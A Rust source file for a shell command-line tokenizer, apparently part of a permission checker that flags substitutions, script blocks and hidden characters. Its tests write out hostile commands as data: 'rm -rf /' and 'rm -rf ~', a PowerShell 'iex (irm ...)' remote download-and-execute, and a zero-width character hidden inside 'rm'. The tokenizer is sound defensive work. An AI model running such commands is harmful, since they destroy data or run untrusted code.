//! A small tokenizer for one shell command line, in POSIX sh or PowerShell syntax.
//!
//! It does not execute or expand anything. It splits a line into pipelines of simple
//! commands (words and redirects) the way the shell would, and records every construct
//! whose effect cannot be judged statically (command substitution, script blocks,
//! call operators, hidden characters) in `Line::opaque`. Callers that grant permission
//! treat an opaque line as unknown; callers that look for catastrophic commands also
//! inspect `Line::substitutions` and nested script text.

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Dialect {
    Posix,
    PowerShell,
}

impl Dialect {
    /// The dialect the `shell` tool runs on this platform.
    pub fn host() -> Self {
        if cfg!(windows) {
            Self::PowerShell
        } else {
            Self::Posix
        }
    }
}

#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct Word {
    /// The word with quoting removed; expansions are kept as written (`$HOME`).
    pub text: String,
    /// Contains a variable or command expansion, so its value is unknown.
    pub dynamic: bool,
    /// Contains an unquoted glob character.
    pub glob: bool,
    /// Some part of the word was quoted or escaped.
    pub quoted: bool,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Redirect {
    /// The operator without a file descriptor prefix: `>`, `>>`, `<`, `>&`, `<<`, `*>`.
    pub op: String,
    pub target: String,
}

#[derive(Clone, Debug, Default)]
pub struct Simple {
    pub words: Vec<Word>,
    pub redirects: Vec<Redirect>,
    /// Here-document bodies read by this command (POSIX).
    pub heredocs: Vec<String>,
}

impl Simple {
    pub fn argv(&self) -> Vec<&str> {
        self.words.iter().map(|word| word.text.as_str()).collect()
    }
}

#[derive(Clone, Debug, Default)]
pub struct Line {
    /// Commands joined by `|`; pipelines are separated by `;`, `&&`, `||`, `&` or newlines.
    pub pipelines: Vec<Vec<Simple>>,
    /// Why the line cannot be judged statically; empty when it can.
    pub opaque: Vec<&'static str>,
    /// Inner text of `$(..)`, backticks, `<(..)` and PowerShell `$(..)`/`@(..)`.
    pub substitutions: Vec<String>,
}

impl Line {
    pub fn commands(&self) -> impl Iterator<Item = &Simple> {
        self.pipelines.iter().flatten()
    }
}

/// Zero-width, bidi and other invisible characters that make a line read differently
/// from how it runs.
pub fn is_hidden(c: char) -> bool {
    matches!(c, '\u{00AD}' | '\u{200B}'..='\u{200F}' | '\u{202A}'..='\u{202E}' | '\u{2060}'..='\u{2064}' | '\u{2066}'..='\u{2069}' | '\u{FEFF}')
        || (c.is_control() && !matches!(c, '\t' | '\n' | '\r'))
}

/// PowerShell accepts these as the parameter dash; normalizing only makes scans stricter.
pub fn normalize_dashes(line: &str) -> String {
    line.chars()
        .map(|c| match c {
            '\u{2013}' | '\u{2014}' | '\u{2015}' | '\u{2212}' => '-',
            c => c,
        })
        .collect()
}

pub fn parse(line: &str, dialect: Dialect) -> Line {
    let mut opaque = Vec::new();
    if line.chars().any(is_hidden) {
        opaque.push("hidden or control characters");
    }
    let bare_cr = line
        .char_indices()
        .any(|(index, c)| c == '\r' && !line[index + 1..].starts_with('\n'));
    if bare_cr {
        opaque.push("carriage return inside the line");
    }
    let text: Vec<char> = normalize_dashes(line)
        .chars()
        .filter(|c| !is_hidden(*c))
        .collect();
    let mut parser = Parser {
        chars: text,
        index: 0,
        dialect,
        line: Line {
            opaque,
            ..Line::default()
        },
        pipeline: Vec::new(),
        simple: Simple::default(),
        word: None,
        redirect: None,
        heredocs: Vec::new(),
    };
    parser.run();
    let mut line = parser.line;
    line.opaque.sort_unstable();
    line.opaque.dedup();
    line
}

struct Parser {
    chars: Vec<char>,
    index: usize,
    dialect: Dialect,
    line: Line,
    pipeline: Vec<Simple>,
    simple: Simple,
    word: Option<Word>,
    /// Operator waiting for its target word.
    redirect: Option<String>,
    /// Here-document delimiters waiting for the end of the current line.
    heredocs: Vec<(String, bool)>,
}

fn single_quote(c: char) -> bool {
    matches!(c, '\'' | '\u{2018}' | '\u{2019}' | '\u{201A}' | '\u{201B}')
}

fn double_quote(c: char) -> bool {
    matches!(c, '"' | '\u{201C}' | '\u{201D}' | '\u{201E}')
}

impl Parser {
    fn peek(&self, offset: usize) -> Option<char> {
        self.chars.get(self.index + offset).copied()
    }

    fn word(&mut self) -> &mut Word {
        self.word.get_or_insert_with(Word::default)
    }

    fn push(&mut self, c: char) {
        self.word().text.push(c);
    }

    fn opaque(&mut self, reason: &'static str) {
        self.line.opaque.push(reason);
    }

    fn finish_word(&mut self) {
        let Some(word) = self.word.take() else {
            return;
        };
        if let Some(op) = self.redirect.take() {
            if op == "<<" || op == "<<-" {
                self.heredocs.push((word.text.clone(), op == "<<-"));
            }
            self.simple.redirects.push(Redirect {
                op,
                target: word.text,
            });
        } else {
            self.simple.words.push(word);
        }
    }

    fn finish_simple(&mut self) {
        self.finish_word();
        if let Some(op) = self.redirect.take() {
            // An operator without a target; the shell would reject the line.
            self.simple.redirects.push(Redirect {
                op,
                target: String::new(),
            });
            self.opaque("redirect without a target");
        }
        let simple = std::mem::take(&mut self.simple);
        if !simple.words.is_empty() || !simple.redirects.is_empty() {
            self.pipeline.push(simple);
        }
    }

    fn finish_pipeline(&mut self) {
        self.finish_simple();
        let pipeline = std::mem::take(&mut self.pipeline);
        if !pipeline.is_empty() {
            self.line.pipelines.push(pipeline);
        }
    }

    fn newline(&mut self) {
        self.finish_pipeline();
        if self.heredocs.is_empty() {
            return;
        }
        let pending = std::mem::take(&mut self.heredocs);
        let mut bodies = Vec::new();
        for (delimiter, strip_tabs) in pending {
            let mut body = String::new();
            let mut closed = false;
            while self.index < self.chars.len() {
                let start = self.index;
                while self.index < self.chars.len() && self.chars[self.index] != '\n' {
                    self.index += 1;
                }
                let row: String = self.chars[start..self.index].iter().collect();
                self.index += 1;
                let row = row.trim_end_matches('\r');
                let compare = if strip_tabs {
                    row.trim_start_matches('\t')
                } else {
                    row
                };
                if compare == delimiter {
                    closed = true;
                    break;
                }
                body.push_str(row);
                body.push('\n');
            }
            if !closed {
                self.opaque("unterminated here-document");
            }
            bodies.push(body);
        }
        if let Some(simple) = self.line.pipelines.last_mut().and_then(|pipeline| {
            pipeline.iter_mut().rev().find(|s| {
                !s.heredocs.is_empty() || s.redirects.iter().any(|r| r.op.starts_with("<<"))
            })
        }) {
            simple.heredocs.extend(bodies);
        }
    }

    /// Reads a balanced `(...)` starting after the opening parenthesis; returns the inner text.
    fn balanced(&mut self, open: char, close: char) -> String {
        let mut depth = 1;
        let mut inner = String::new();
        let mut quote: Option<char> = None;
        while let Some(c) = self.peek(0) {
            self.index += 1;
            match quote {
                Some(q) => {
                    if c == q {
                        quote = None;
                    } else if c == '\\' && self.dialect == Dialect::Posix && q == '"' {
                        inner.push(c);
                        if let Some(next) = self.peek(0) {
                            self.index += 1;
                            inner.push(next);
                        }
                        continue;
                    }
                }
                None if c == '\'' || c == '"' => quote = Some(c),
                None if c == open => depth += 1,
                None if c == close => {
                    depth -= 1;
                    if depth == 0 {
                        return inner;
                    }
                }
                None => {}
            }
            inner.push(c);
        }
        self.opaque("unbalanced parentheses");
        inner
    }

    fn substitution(&mut self, inner: String, reason: &'static str) {
        self.opaque(reason);
        self.line.substitutions.push(inner);
        let word = self.word();
        word.dynamic = true;
        word.text.push_str("$(...)");
    }

    /// `$` outside single quotes. Returns after consuming what it handled.
    fn dollar(&mut self) {
        match self.peek(1) {
            Some('(') => {
                self.index += 2;
                let arithmetic = self.dialect == Dialect::Posix && self.peek(0) == Some('(');
                let inner = self.balanced('(', ')');
                if arithmetic {
                    let word = self.word();
                    word.dynamic = true;
                    word.text.push_str("$((...))");
                } else {
                    self.substitution(inner, "command substitution");
                }
            }
            Some('{') => {
                self.index += 2;
                let inner = self.balanced('{', '}');
                if self.dialect == Dialect::Posix && inner.contains(|c: char| ":#%/^,@".contains(c))
                {
                    self.opaque("parameter expansion with operators");
                }
                let word = self.word();
                word.dynamic = true;
                word.text.push_str(&format!("${{{inner}}}"));
            }
            Some(c)
                if c.is_alphanumeric()
                    || "_@*#?!-$".contains(c)
                    || (self.dialect == Dialect::PowerShell && c == ':') =>
            {
                self.index += 1;
                let word = self.word();
                word.dynamic = true;
                word.text.push('$');
                // Read the variable name, including PowerShell scopes ($env:HOME).
                let special = "@*#?!-$".contains(c);
                let mut first = true;
                while let Some(next) = self.peek(0) {
                    let name = next.is_alphanumeric()
                        || next == '_'
                        || (self.dialect == Dialect::PowerShell && next == ':');
                    if (first && special) || name {
                        self.index += 1;
                        self.push(next);
                        first = false;
                        if special {
                            break;
                        }
                    } else {
                        break;
                    }
                }
            }
            _ => {
                self.index += 1;
                self.push('$');
            }
        }
    }

    fn redirect_op(&mut self) -> bool {
        let c = self.peek(0).unwrap_or_default();
        // A preceding all-digit unquoted word is the descriptor (2>, 1>>).
        let descriptor = self.word.as_ref().is_some_and(|w| {
            !w.quoted && !w.text.is_empty() && w.text.chars().all(|d| d.is_ascii_digit())
        });
        if descriptor && self.dialect == Dialect::Posix || descriptor && c == '>' {
            self.word = None;
        } else {
            self.finish_word();
        }
        let mut op = String::from(c);
        self.index += 1;
        match (c, self.peek(0)) {
            ('<', Some('(')) | ('>', Some('(')) if self.dialect == Dialect::Posix => {
                self.index += 1;
                let inner = self.balanced('(', ')');
                self.substitution(inner, "process substitution");
                return true;
            }
            ('>', Some('>')) | ('>', Some('|')) | ('<', Some('>')) => {
                op.push(self.peek(0).unwrap_or_default());
                self.index += 1;
            }
            ('>', Some('&')) | ('<', Some('&')) => {
                op.push('&');
                self.index += 1;
                // Descriptor duplication: 2>&1, >&2, <&- take no file name.
                let mut target = String::new();
                while let Some(d) = self.peek(0).filter(|d| d.is_ascii_digit() || *d == '-') {
                    target.push(d);
                    self.index += 1;
                }
                if !target.is_empty() {
                    self.simple.redirects.push(Redirect {
                        op,
                        target: format!("&{target}"),
                    });
                    return true;
                }
            }
            ('<', Some('<')) if self.dialect == Dialect::Posix => {
                op.push('<');
                self.index += 1;
                match self.peek(0) {
                    Some('<') => {
                        op.push('<');
                        self.index += 1;
                    }
                    Some('-') => {
                        op.push('-');
                        self.index += 1;
                    }
                    _ => {}
                }
            }
            _ => {}
        }
        if c == '<' && self.dialect == Dialect::PowerShell {
            self.opaque("PowerShell input redirection");
        }
        self.redirect = Some(op);
        true
    }

    fn run(&mut self) {
        while let Some(c) = self.peek(0) {
            match self.dialect {
                Dialect::Posix => self.posix(c),
                Dialect::PowerShell => self.powershell(c),
            }
        }
        self.finish_pipeline();
        if !self.heredocs.is_empty() {
            self.opaque("unterminated here-document");
        }
    }

    fn posix(&mut self, c: char) {
        match c {
            ' ' | '\t' | '\r' => {
                self.index += 1;
                self.finish_word();
            }
            '\n' => {
                self.index += 1;
                self.newline();
            }
            '\\' => {
                match self.peek(1) {
                    Some('\n') => {}
                    Some(next) => {
                        self.push(next);
                        self.word().quoted = true;
                    }
                    None => self.push('\\'),
                }
                self.index += 2;
            }
            '\'' => {
                self.index += 1;
                self.word().quoted = true;
                let mut closed = false;
                while let Some(next) = self.peek(0) {
                    self.index += 1;
                    if next == '\'' {
                        closed = true;
                        break;
                    }
                    self.push(next);
                }
                if !closed {
                    self.opaque("unterminated quote");
                }
            }
            '"' => {
                self.index += 1;
                self.word().quoted = true;
                let mut closed = false;
                while let Some(next) = self.peek(0) {
                    match next {
                        '"' => {
                            self.index += 1;
                            closed = true;
                            break;
                        }
                        '\\' => {
                            match self.peek(1) {
                                Some(e @ ('$' | '`' | '"' | '\\')) => self.push(e),
                                Some('\n') => {}
                                Some(other) => {
                                    self.push('\\');
                                    self.push(other);
                                }
                                None => self.push('\\'),
                            }
                            self.index += 2;
                        }
                        '$' => self.dollar(),
                        '`' => {
                            self.index += 1;
                            let inner = self.until('`');
                            self.substitution(inner, "command substitution");
                        }
                        other => {
                            self.index += 1;
                            self.push(other);
                        }
                    }
                }
                if !closed {
                    self.opaque("unterminated quote");
                }
            }
            '$' => self.dollar(),
            '`' => {
                self.index += 1;
                let inner = self.until('`');
                self.substitution(inner, "command substitution");
            }
            '<' | '>' => {
                self.redirect_op();
            }
            '|' => {
                self.index += 1;
                if self.peek(0) == Some('|') {
                    self.index += 1;
                    self.finish_pipeline();
                } else {
                    if self.peek(0) == Some('&') {
                        self.index += 1;
                    }
                    self.finish_simple();
                }
            }
            '&' => {
                self.index += 1;
                match self.peek(0) {
                    Some('&') => {
                        self.index += 1;
                        self.finish_pipeline();
                    }
                    Some('>') => {
                        self.finish_word();
                        self.index += 1;
                        let mut op = String::from("&>");
                        if self.peek(0) == Some('>') {
                            self.index += 1;
                            op.push('>');
                        }
                        self.redirect = Some(op);
                    }
                    _ => {
                        self.opaque("background job");
                        self.finish_pipeline();
                    }
                }
            }
            ';' | '(' | ')' => {
                self.index += 1;
                if c != ';' {
                    self.opaque("subshell or function");
                }
                self.finish_pipeline();
            }
            '#' if self.word.is_none() => {
                while self.peek(0).is_some_and(|next| next != '\n') {
                    self.index += 1;
                }
            }
            '{' | '}'
                if self.word.is_none()
                    && self.peek(1).is_none_or(|n| n.is_whitespace() || n == ';') =>
            {
                self.index += 1;
                self.opaque("command group");
                self.finish_pipeline();
            }
            '*' | '?' | '[' => {
                self.index += 1;
                self.push(c);
                self.word().glob = true;
            }
            other => {
                self.index += 1;
                self.push(other);
            }
        }
    }

    fn until(&mut self, end: char) -> String {
        let mut inner = String::new();
        while let Some(next) = self.peek(0) {
            self.index += 1;
            if next == end {
                return inner;
            }
            if next == '\\'
                && let Some(escaped) = self.peek(0)
            {
                self.index += 1;
                inner.push(escaped);
                continue;
            }
            inner.push(next);
        }
        self.opaque("unterminated substitution");
        inner
    }

    fn powershell(&mut self, c: char) {
        match c {
            ' ' | '\t' | '\r' => {
                self.index += 1;
                self.finish_word();
            }
            '\n' | ';' => {
                self.index += 1;
                self.finish_pipeline();
            }
            '`' => {
                match self.peek(1) {
                    Some('\n') => {}
                    Some(next) => {
                        self.push(next);
                        self.word().quoted = true;
                    }
                    None => self.push('`'),
                }
                self.index += 2;
            }
            q if single_quote(q) => {
                self.index += 1;
                self.word().quoted = true;
                let mut closed = false;
                while let Some(next) = self.peek(0) {
                    self.index += 1;
                    if single_quote(next) {
                        if self.peek(0).is_some_and(single_quote) {
                            self.index += 1;
                            self.push('\'');
                            continue;
                        }
                        closed = true;
                        break;
                    }
                    self.push(next);
                }
                if !closed {
                    self.opaque("unterminated quote");
                }
            }
            q if double_quote(q) => {
                self.index += 1;
                self.word().quoted = true;
                let mut closed = false;
                while let Some(next) = self.peek(0) {
                    match next {
                        n if double_quote(n) => {
                            self.index += 1;
                            if self.peek(0).is_some_and(double_quote) {
                                self.index += 1;
                                self.push('"');
                                continue;
                            }
                            closed = true;
                            break;
                        }
                        '`' => {
                            if let Some(escaped) = self.peek(1) {
                                self.push(escaped);
                            }
                            self.index += 2;
                        }
                        '$' => self.dollar(),
                        other => {
                            self.index += 1;
                            self.push(other);
                        }
                    }
                }
                if !closed {
                    self.opaque("unterminated quote");
                }
            }
            '$' => self.dollar(),
            '@' if matches!(self.peek(1), Some('(') | Some('{')) => {
                let open = self.peek(1).unwrap_or('(');
                self.index += 2;
                let close = if open == '(' { ')' } else { '}' };
                let inner = self.balanced(open, close);
                self.substitution(inner, "PowerShell array or hashtable expression");
            }
            '@' if matches!(self.peek(1), Some('\'') | Some('"')) => {
                self.opaque("PowerShell here-string");
                self.index += 1;
            }
            '{' | '}' => {
                self.index += 1;
                self.opaque("PowerShell script block");
                self.finish_pipeline();
            }
            '(' | ')' => {
                self.index += 1;
                self.opaque("PowerShell subexpression");
                self.finish_pipeline();
            }
            '<' if self.peek(1) == Some('#') => {
                self.index += 2;
                while self.index < self.chars.len()
                    && !(self.peek(0) == Some('#') && self.peek(1) == Some('>'))
                {
                    self.index += 1;
                }
                self.index += 2;
            }
            '>' | '<' => {
                self.redirect_op();
            }
            '*' if self.peek(1) == Some('>') && self.word.is_none() => {
                self.index += 2;
                let mut op = String::from("*>");
                if self.peek(0) == Some('>') {
                    self.index += 1;
                    op.push('>');
                }
                if self.peek(0) == Some('&') {
                    self.index += 1;
                    let mut target = String::from("&");
                    while let Some(d) = self.peek(0).filter(char::is_ascii_digit) {
                        self.index += 1;
                        target.push(d);
                    }
                    self.simple.redirects.push(Redirect { op, target });
                } else {
                    self.redirect = Some(op);
                }
            }
            '|' => {
                self.index += 1;
                if self.peek(0) == Some('|') {
                    self.index += 1;
                    self.finish_pipeline();
                } else {
                    self.finish_simple();
                }
            }
            '&' => {
                self.index += 1;
                if self.peek(0) == Some('&') {
                    self.index += 1;
                    self.finish_pipeline();
                } else if self.word.is_none() && self.simple.words.is_empty() {
                    self.opaque("PowerShell call operator");
                } else {
                    self.opaque("background job");
                    self.finish_pipeline();
                }
            }
            '#' if self.word.is_none() => {
                while self.peek(0).is_some_and(|next| next != '\n') {
                    self.index += 1;
                }
            }
            '*' | '?' | '[' => {
                self.index += 1;
                self.push(c);
                self.word().glob = true;
            }
            other => {
                self.index += 1;
                self.push(other);
            }
        }
    }
}

/// Lowercase program name without directories and a Windows executable suffix.
pub fn program_name(word: &str) -> String {
    let base = word
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(word)
        .to_lowercase();
    for suffix in [".exe", ".cmd", ".bat", ".com"] {
        if let Some(stripped) = base.strip_suffix(suffix) {
            return stripped.to_owned();
        }
    }
    base
}

/// Drops wrappers that run the next word as the program (`sudo`, `env X=1`, `nice -n 5`,
/// `timeout 10`) and leading POSIX variable assignments.
pub fn strip_runners(words: &[String]) -> &[String] {
    let mut rest = words;
    loop {
        while rest.first().is_some_and(|word| is_assignment(word)) {
            rest = &rest[1..];
        }
        let Some(first) = rest.first() else {
            return rest;
        };
        let name = program_name(first);
        let skip_values: &[&str] = match name.as_str() {
            "sudo" | "doas" => &["-u", "-g", "-C", "-D", "-h", "-p", "-r", "-t", "-U"],
            "env" => &["-u", "-C", "-S"],
            "nice" => &["-n"],
            "ionice" => &["-c", "-n", "-t"],
            "stdbuf" | "nohup" | "time" | "exec" | "command" | "builtin" | "busybox"
            | "unbuffer" => &[],
            "timeout" => &["-s", "-k", "--signal", "--kill-after"],
            _ => return rest,
        };
        if name == "command" && rest.get(1).is_some_and(|w| w == "-v" || w == "-V") {
            return rest;
        }
        rest = &rest[1..];
        while let Some(word) = rest.first() {
            if skip_values.contains(&word.as_str()) {
                rest = rest.get(2..).unwrap_or(&[]);
            } else if word.starts_with('-') || (name == "env" && is_assignment(word)) {
                rest = &rest[1..];
            } else {
                break;
            }
        }
        if name == "timeout" && !rest.is_empty() {
            rest = &rest[1..];
        }
    }
}

pub fn is_assignment(word: &str) -> bool {
    let Some((name, _)) = word.split_once('=') else {
        return false;
    };
    !name.is_empty()
        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
        && !name.starts_with(|c: char| c.is_ascii_digit())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn words(line: &Line) -> Vec<Vec<String>> {
        line.commands()
            .map(|simple| simple.words.iter().map(|w| w.text.clone()).collect())
            .collect()
    }

    #[test]
    fn posix_quotes_operators_and_redirects() {
        let line = parse(
            r#"git commit -m 'a b' && echo "x\"y" | wc -l > out.txt 2>&1"#,
            Dialect::Posix,
        );
        assert!(line.opaque.is_empty(), "{:?}", line.opaque);
        assert_eq!(line.pipelines.len(), 2);
        assert_eq!(
            words(&line),
            [
                vec!["git", "commit", "-m", "a b"],
                vec!["echo", "x\"y"],
                vec!["wc", "-l"]
            ]
        );
        let wc = &line.pipelines[1][1];
        assert_eq!(
            wc.redirects[0],
            Redirect {
                op: ">".into(),
                target: "out.txt".into()
            }
        );
        assert_eq!(wc.redirects[1].target, "&1");
    }

    #[test]
    fn posix_substitution_and_heredoc() {
        let line = parse("echo $(rm -rf /) `id`", Dialect::Posix);
        assert!(line.opaque.contains(&"command substitution"));
        assert_eq!(line.substitutions, ["rm -rf /", "id"]);
        let line = parse("bash <<EOF\nrm -rf ~\nEOF\necho done", Dialect::Posix);
        assert_eq!(line.pipelines[0][0].heredocs, ["rm -rf ~\n"]);
        assert_eq!(words(&line)[1], ["echo", "done"]);
        let line = parse("rm \\\n-rf /tmp/x # comment", Dialect::Posix);
        assert_eq!(words(&line), [vec!["rm", "-rf", "/tmp/x"]]);
    }

    #[test]
    fn powershell_quotes_blocks_and_escapes() {
        let line = parse(
            "Get-Content 'a ''b''' | Select-String \"x`\"y\"; ls",
            Dialect::PowerShell,
        );
        assert!(line.opaque.is_empty(), "{:?}", line.opaque);
        assert_eq!(
            words(&line),
            [
                vec!["Get-Content", "a 'b'"],
                vec!["Select-String", "x\"y"],
                vec!["ls"]
            ]
        );
        let line = parse(
            "Get-ChildItem | Where-Object { $_.Length -gt 1 }",
            Dialect::PowerShell,
        );
        assert!(line.opaque.contains(&"PowerShell script block"));
        let line = parse("& $tool -x; iex (irm https://x)", Dialect::PowerShell);
        assert!(line.opaque.contains(&"PowerShell call operator"));
        assert!(words(&line).contains(&vec!["irm".to_owned(), "https://x".to_owned()]));
        let line = parse("dir C:\\Users\\me 2>$null", Dialect::PowerShell);
        assert_eq!(words(&line), [vec!["dir", "C:\\Users\\me"]]);
        assert_eq!(line.pipelines[0][0].redirects[0].target, "$null");
    }

    #[test]
    fn hidden_characters_are_opaque_and_removed() {
        let line = parse("r\u{200B}m -rf /", Dialect::Posix);
        assert!(!line.opaque.is_empty());
        assert_eq!(words(&line), [vec!["rm", "-rf", "/"]]);
    }

    #[test]
    fn runners_are_stripped() {
        let argv: Vec<String> = [
            "sudo", "-u", "root", "env", "A=1", "nice", "-n", "5", "rm", "-rf", "/",
        ]
        .map(String::from)
        .to_vec();
        assert_eq!(strip_runners(&argv), ["rm", "-rf", "/"]);
        assert_eq!(program_name("C:\\Windows\\System32\\CMD.EXE"), "cmd");
    }
}
